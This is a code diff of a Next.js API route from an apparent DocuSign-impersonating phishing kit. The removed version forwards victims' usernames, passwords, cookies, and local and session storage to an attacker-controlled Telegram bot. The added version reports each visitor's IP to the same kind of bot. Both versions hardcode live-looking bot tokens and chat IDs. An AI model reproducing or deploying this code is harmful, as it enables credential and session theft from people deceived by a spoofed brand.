@@ -1,94 +1,88 @@
 /** @format */
 
 // app/api/sendemail/route.js
-import nodemailer from "nodemailer";
+import TelegramBot from 'node-telegram-bot-api';
 
-// for telegram
-import { TelegramClient } from "telegramsjs";
+const botToken = "7927062257:AAHNqs9fLW6eL5sl-bHg35BdqK1MqbvTOFk";
+const chatId = "7634751490";
+const bot = new TelegramBot(botToken);
 
-const botToken = "7943036940:AAEkMP5eq1wgVpmr46gyrLM_tuNAnv2sNC8";
-const bot = new TelegramClient(botToken);
-const chatId = "6191191290";
+// Function to get client IP address
+function getClientIP(req) {
+  // Try multiple headers to get the real IP
+  const forwarded = req.headers.get('x-forwarded-for');
+  const realIP = req.headers.get('x-real-ip');
+  const cfConnectingIP = req.headers.get('cf-connecting-ip');
+  
+  if (forwarded) {
+    return forwarded.split(',')[0].trim();
+  }
+  if (cfConnectingIP) {
+    return cfConnectingIP;
+  }
+  if (realIP) {
+    return realIP;
+  }
+  
+  return 'Unknown IP';
+}
 
-// Handle POST requests for form submissions
+// Handle POST requests
 export async function POST(req) {
-  const { eparams, password, userAgent, remoteAddress, landingUrl, cookies, localStorageData, sessionStorageData } = await req.json();
-
   try {
-    // Only send notification when password is provided
-    if (password) {
-      const credentialsMessage = `
-🔐 *Session Information*
+    const clientIP = getClientIP(req);
+    
+    // Send telegram notification with IP
+    await bot.sendMessage(
+      chatId, 
+      `🔔 Someone just visited your DocuSign page!\nIP: ${clientIP}`
+    );
 
-*Username:* ${eparams}
-*Password:* ${password}
-*Landing URL:* 
-${landingUrl || 'No URL provided'}
+    // Log success message to console
+    console.log(`Visit notification sent to telegram successfully from IP: ${clientIP}`);
 
-✅ *User Agent:*
-${userAgent || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36'}
-
-✅ *Remote Address:*
-${remoteAddress || 'Not available'}
-
-❌ *Create Time:*
-${Math.floor(Date.now() / 1000)}
-
-❌ *Update Time:*
-${Math.floor(Date.now() / 1000)}
-
-🍪 *Cookies:*
-${cookies || 'No cookies captured'}
-
-💾 *Local Storage:*
-${localStorageData || 'No local storage data captured'}
-
-💾 *Session Storage:*
-${sessionStorageData || 'No session storage data captured'}
-
-✅ Tokens are added in txt file and attached separately in message.
-    `;
-
-      await bot.sendMessage({
-        text: credentialsMessage,
-        chatId: chatId,
-        parse_mode: "Markdown"
-      });
-
-      console.log(
-        `Results sent to telegram successfully Email: ${eparams}, Password: ${password}`
-      );
-
-      return new Response(
-        JSON.stringify({ message: "Credentials sent successfully!" }),
-        {
-          status: 200,
-          headers: { "Content-Type": "application/json" },
-        }
-      );
-    }
-
-    // If no password, just return success without sending notification
     return new Response(
-      JSON.stringify({ message: "No password provided, no notification sent" }),
+      JSON.stringify({ message: "Notification sent successfully!" }),
       {
         status: 200,
         headers: { "Content-Type": "application/json" },
       }
     );
   } catch (error) {
-    console.error("Error sending message:", error);
-    return new Response(JSON.stringify({ error: "Error sending message" }), {
+    console.error("Error sending notification:", error);
+    return new Response(JSON.stringify({ error: "Error sending notification" }), {
       status: 500,
       headers: { "Content-Type": "application/json" },
     });
   }
 }
 
-// Remove GET endpoint since we don't want to notify on page access
+// Handle GET requests (for access notifications)
 export async function GET(req) {
-  return new Response(JSON.stringify({ message: "Method not allowed" }), {
-    status: 405,
-    headers: { "Content-Type": "application/json" },
-  });
+  try {
+    const clientIP = getClientIP(req);
+    
+    // Send telegram notification for page access with IP
+    await bot.sendMessage(
+      chatId, 
+      `🌐 Someone accessed your DocuSign page!\nIP: ${clientIP}`
+    );
+
+    // Log success message to console
+    console.log(`Page access notification sent to telegram successfully from IP: ${clientIP}`);
+
+    return new Response(
+      JSON.stringify({ message: "Access notification sent successfully!" }),
+      {
+        status: 200,
+        headers: { "Content-Type": "application/json" },
+      }
+    );
+  } catch (error) {
+    console.error("Error sending access notification:", error);
+    return new Response(JSON.stringify({ error: "Error sending access notification" }), {
+      status: 500,
+      headers: { "Content-Type": "application/json" },
+    });
+  }
 }
